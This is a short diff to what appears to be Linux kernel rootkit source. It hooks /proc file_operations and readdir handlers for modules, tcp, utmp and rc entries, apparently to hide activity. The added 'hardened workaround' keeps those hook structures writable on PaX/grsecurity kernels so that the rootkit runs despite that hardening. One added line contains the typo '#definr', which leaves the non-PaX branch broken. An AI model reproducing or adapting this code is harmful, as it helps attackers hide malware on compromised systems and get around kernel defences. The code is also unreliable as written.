@@ -104,6 +104,14 @@ proc_origin = inode->i_fop;\
 fops.readdir = func;\
 inode->i_fop = &fops
 
+/* hardened workaround */
+#ifdef CONFIG_PAX
+typedef struct file_operations __no_const fops_no_const;
+#define FOPS_TYPE static fops_no_const
+#else
+#definr FOPS_TYPE static struct file_operations
+#endif
+
 struct exit_status {
   short int e_termination;    /* process termination status */
   short int e_exit;           /* process exit status */
@@ -131,8 +139,8 @@ struct utmp {
 /* Injection structs */
 struct inode *pinode, *tinode, *uinode, *rcinode, *modinode, *sinode;
 struct proc_dir_entry *modules, *root, *handler, *tcp;
-static struct file_operations modules_fops, proc_fops, handler_fops, tcp_fops, user_fops, rc_fops, mod_fops, stat_fops;
 filldir_t proc_filldir, rc_filldir, mod_filldir;
+FOPS_TYPE modules_fops, proc_fops, handler_fops, tcp_fops, user_fops, rc_fops, mod_fops, stat_fops;
 const struct file_operations *proc_original = 0,
                              *modules_proc_original = 0,
                              *stat_proc_original = 0,
